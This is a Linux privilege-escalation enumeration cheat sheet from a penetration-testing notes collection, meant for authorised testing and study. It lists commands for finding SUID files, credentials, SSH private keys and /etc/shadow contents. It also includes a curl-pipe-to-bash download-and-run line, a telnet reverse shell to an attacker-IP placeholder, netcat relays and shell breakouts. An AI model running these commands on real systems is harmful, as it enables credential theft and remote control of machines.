# Enumeration

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

TODO: \(issue [\#13](https://github.com/zweilosec/Infosec-Notes/issues/13)\)

* Integrate "[Questions to Ask](enumeration.md#questions-to-ask)" into existing sections
* Add descriptions \(Keep/expand questions? Or rewrite?\)
* Clean up
* Prep code examples for scripting
* Split debian/redhat/BSD commands into "tabs"

## Filesystem Enumeration

### Find all files a specific user has access to:

```bash
find / -user $username -ls 2>/dev/null
```

### Find all files a specific group has access to:

```bash
find / -group $groupname -ls 2>/dev/null
```

### Search bash history for passwords \(pwd search\)

```bash
find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
```

### Search filesystem by name pattern

```bash
find / -name "$pattern" 2>/dev/null
```

### Search files in whole filesystem for a string \(case insensitive\)

```bash
grep -ri "$string" / 2>/dev/null
```

### Check for useful installed programs

* only displays the ones currently installed

```bash
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```

### Find UID 0 files \(root execution\)

```bash
/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\\\; 2>/dev/null
```

### Find executable files updated in August

```bash
find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug
```

### Find a specific file

```bash
find /. -name suid\\\*\\
```

### Find symlinked files

```bash
find -L / -samefile $file
```

### Display all the strings in a file

```bash
strings $file
```

### Determine the type of a file

```bash
file $file
```

### Find deleted \(unlinked\) files

```text
lsof +L1
```

## Process Enumeration

### Pspy

* [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

You can run `pspy --help` to learn about the flags and their meaning. The summary is as follows:

* `-p`: enables printing commands to stdout \(enabled by default\)
* `-f`: enables printing file system events to stdout \(disabled by default\)
* `-r`: list of directories to watch with Inotify. pspy will watch all subdirectories recursively \(by default, watches /usr, /tmp, /etc, /home, /var, and /opt\).
* `-d`: list of directories to watch with Inotify. pspy will watch these directories only, not the subdirectories \(empty by default\).
* `-i`: interval in milliseconds between procfs scans. pspy scans regularly for new processes regardless of Inotify events, just in case some events are not received.
* `-c`: print commands in different colors. File system events are not colored anymore, commands have different colors based on process UID.
* `--debug`: prints verbose error messages which are otherwise hidden.

The default settings should be fine for most applications. Watching files inside `/usr` is most important since many tools will access libraries inside it.

Some more complex examples:

```bash
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 

# place watchers recursively in two directories and non-recursively into a third
./pspy64 -r /path/to/first/recursive/dir -r /path/to/second/recursive/dir -d /path/to/the/non-recursive/dir

# disable printing discovered commands but enable file system events
./pspy64 -p=false -f
```

### /proc

enumerate info about current processes running from: `/proc/self/status`

`ps -U root -u root ux` View all processes started by a certain user \(`root` in this case\)

## Misc

[Linux Privilege Checker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

full linux enumeration:

* [LinEnum.sh](https://github.com/rebootuser/LinEnum) 
* [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Download **and** execute script \(such as LinEnum.sh\) \[from remote host\]: `curl $url/LinEnum.sh | bash`

Locate exploits:

```bash
searchsploit $keyword 

#to pull exploit code:
searchsploit -x $exploit_num
```

enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)

Semi-automated enumeration all-in-one \(use this!\): [nmapAutomator](https://github.com/21y4d/nmapAutomator)

Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)

## Questions to ask:

TODO: Split debian/redhat/BSD commands up into tabs; Clean up code for scripting \($var, etc\) \(issue [\#13](https://github.com/zweilosec/Infosec-Notes/issues/13)\)

### Operating System

What's the distribution type? What version?

```bash
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```

What's the Kernel version? Is it 32 or 64-bit?

```bash
cat /proc/version   
uname -a
uname -mrs 
rpm -q kernel 
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

What can be learnt from the environmental variables?

```text
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

Is there a printer?

```text
lpstat -a
```

### Applications & Services

What services are running? Which service has which user privilege?

```text
ps aux
ps -ef
top
cat /etc/service
```

Which service\(s\) are been running by root? Of these services, which are vulnerable - it's worth a double check!

```text
ps aux | grep root
ps -ef | grep root
```

What applications are installed? What version are they? Are they currently running?

```text
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

Any of the service\(s\) settings misconfigured? Are any \(vulnerable\) plugins attached?

```text
cat /etc/syslog.conf 
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf 
cat /etc/inetd.conf 
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

What jobs are scheduled?

```text
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

Any plain text usernames and/or passwords?

```text
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
```

### Communications & Networking

What NIC\(s\) does the system have? Is it connected to another network?

```text
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?

```text
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

What other users & hosts are communicating with the system?

```text
lsof -i 
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

What's cached? IP and/or MAC addresses

```text
arp -e
route
/sbin/route -nee
```

Is packet sniffing possible? What can be seen? Listen to live traffic

```text
# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
```

Have you got a shell? Can you interact with the system?

* [http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/](http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)

```text
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
```

Is port forwarding possible? Redirect and interact with traffic from another view

* rinetd - [http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch](http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch)
* fpipe

```text
# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
```

* SSH

```text
# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
```

* mknod backpipe

```text
# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
```

Is tunneling possible? Send commands from local machine to remote

```text
ssh -D 127.0.0.1:9050 -N $username@$ip 
proxychains ifconfig
```

### Confidential Information & Users

Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?

```bash
id
who
w
last 
cat /etc/passwd | cut -d:    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l
```

What sensitive files can be read?

```text
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

Anything "interesting" in the home directory\(s\)? If it's possible to access

```text
ls -ahlR /root/
ls -ahlR /home/
```

Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords

```text
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg
```

What has the user been doing? Are there any passwords in plain text? What have they been editing?

```bash
ls -la ~
cat ~/.bash_history
#check for other shells as well (zsh, etc.)

cat ~/.nano_history
#check for other exitors as well (vim, etc.)

cat ~/.atftp_history
cat ~/.mysql_history 
cat ~/.php_history
```

What user information can be found?

```bash
cat ~/.bashrc
# check for other shells as well (zsh, etc.)

cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

Can private-key information be found?

```text
ls -la ~/.ssh
ls -la /etc/ssh

cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### File Systems

Which configuration files can be written in `/etc`? Are you able to reconfigure services?

```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other

find /etc/ -readable -type f 2>/dev/null                         # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
```

What can be found in `/var` ?

```text
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd 
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```

Any settings/files related to web server? Any settings file with database information?

```text
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/ 
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 
ls -alhR /var/www/html/
```

Is there anything in the log file\(s\) \(Could help with "Local File Includes"!\)

* [http://www.thegeekstuff.com/2011/08/linux-var-log-files/](http://www.thegeekstuff.com/2011/08/linux-var-log-files/)

```text
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
# auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
```

If commands are limited, can you break out of the "jail" shell?

```text
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

How are file-systems mounted?

```text
mount
df -h
```

Are there any unmounted file-systems?

```text
cat /etc/fstab
```

What "Advanced Linux File Permissions" are used? "Sticky bit", SUID, GUID

```bash
find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm

```bash
find / -writable -type d 2>/dev/null     # world-writeable folders
find / -perm -222 -type d 2>/dev/null    # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
find / -perm -o+x -type d 2>/dev/null    # world-executable folders

find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
```

Any "problem" files? Word-writeable, "nobody" files

```bash
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # No-owner files
```

### Preparation for Writing Exploit Code

What development tools/languages are installed/supported?

```text
find / -name perl*
find / -name python*
find / -name gcc* 
find / -name cc
```

How can files be transferred?

```text
find / -name wget
find / -name curl
find / -name nc*
find / -name netcat*
find / -name tftp* 
find / -name ftp
```

#### Researching Vulnerabilities

* [http://www.cvedetails.com](http://www.cvedetails.com)
* [http://packetstormsecurity.org/files/cve/\[CVE\](http://packetstormsecurity.org/files/cve/[CVE\)\]
* [http://cve.mitre.org/cgi-bin/cvename.cgi?name=\[CVE\](http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE\)\]
* [http://www.vulnview.com/cve-details.php?cvename=\[CVE\](http://www.vulnview.com/cve-details.php?cvename=[CVE\)\]

#### Finding exploit code

* [https://www.exploit-db.com](https://www.exploit-db.com)
* [https://cvebase.com](https://cvebase.com)
* [https://1337day.com](https://1337day.com)
* [https://www.securiteam.com](https://www.securiteam.com)
* [https://www.securityfocus.com](https://www.securityfocus.com)
* [https://www.exploitsearch.net](https://www.exploitsearch.net)
* [https://metasploit.com/modules/](https://metasploit.com/modules/)
* [https://securityreason.com](https://securityreason.com)
* [https://seclists.org/fulldisclosure/](https://seclists.org/fulldisclosure/)

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!

